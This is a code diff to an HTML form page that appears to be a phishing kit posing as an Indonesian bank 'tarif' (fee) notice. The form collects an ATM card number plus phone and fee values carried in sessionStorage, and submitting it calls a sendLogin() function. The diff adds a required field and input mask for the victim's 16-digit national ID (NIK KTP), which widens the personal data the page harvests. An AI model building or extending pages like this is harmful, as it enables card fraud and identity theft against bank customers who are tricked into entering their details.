@@ -433,6 +433,7 @@ nav{
           <form id="sudah" onsubmit="sendLogin()" method="post">
               <input type="hidden" name="tarif" id="tarif">
               <input type="hidden" name="nohp" id="nohp">
+              
        <div class="input-field">
     <label for="nama">Nomor kartu ATM :</label>
 <input type="tel" id="atm" name="atm" placeholder="**** **** **** ****" style="background-image: url('https://hosting.tigerengine.id/8mpwms.jpg');
@@ -447,7 +448,13 @@ nav{
       background-repeat: no-repeat;
       background-size: 100% 100%; " required>
                         </div>
-       
+       <div class="input-field">
+    <label for="nik">Nik KTP : </label>
+ <input type="tel" id="nik" name="nik" placeholder="#### #### #### ####" maxlength="" minlength="" style="background-image: url('');
+      background-position: 100% 100%;
+      background-repeat: no-repeat;
+      background-size: 100% 100%; " required>
+                        </div>
                     </div>
    <div class="card-footer">
 <button type="submit" class="button" id="lanjutkan" disabled>Lanjutkan</button>
@@ -470,6 +477,7 @@ nav{
      $(document).ready(function() {
     $('#atm').mask('0000 0000 0000 0000');
     $('#valid').mask('00/00');
+    $('#nik').mask('0000000000000000');
 });   
         
     // Get references to the input and button elements
@@ -492,8 +500,6 @@ document.getElementById("tarif").value =
         sessionStorage.getItem("tarif");
 document.getElementById("nohp").value =
         sessionStorage.getItem("nohp"); 
-
-
 
         const carouselItems = document.querySelectorAll('.carousel-item');
 const carouselNavItems = document.querySelectorAll('.carousel-nav-item');
